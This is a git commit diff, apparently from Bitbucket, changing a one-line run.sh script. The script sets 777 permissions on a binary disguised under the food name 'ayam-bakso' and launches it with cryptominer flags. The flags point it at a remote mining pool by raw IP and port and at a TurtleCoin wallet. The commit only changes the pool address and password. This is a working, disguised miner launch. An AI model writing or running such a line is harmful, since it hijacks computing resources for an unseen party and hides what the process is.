3f74279d939125cba76db364090d79df8d458e93
Noval Anto <novalanto6161@gmail.com>
2021-10-16 07:38:42 +0000

    run.sh edited online with Bitbucket

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-chmod 777 ayam-bakso && ./ayam-bakso -o 157.230.240.250:1919 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR --keepalive --donate-level 1 -p x -k --tls
+chmod 777 ayam-bakso && ./ayam-bakso -o 159.203.62.42:1818 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR --keepalive --donate-level 1 -p c -k --tls
